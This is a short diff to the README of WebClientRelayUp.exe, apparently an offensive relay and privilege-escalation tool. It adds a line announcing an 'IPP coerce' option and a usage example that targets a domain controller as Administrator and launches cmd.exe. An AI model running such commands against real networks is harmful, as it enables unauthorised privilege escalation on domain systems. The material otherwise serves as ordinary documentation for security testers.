@@ -56,6 +56,12 @@ Optional Arguments:
  Usage example:
   WebClientRelayUp.exe -t dc01.contoso.local -u Administrator -c cmd.exe
 ```
+New feature ! IPP coerce is now available :
+
+```
+WebClientRelayUp.exe -t dc01.contoso.local -u Administrator -c cmd.exe --ipp
+```
+
 
 ## Installation
 
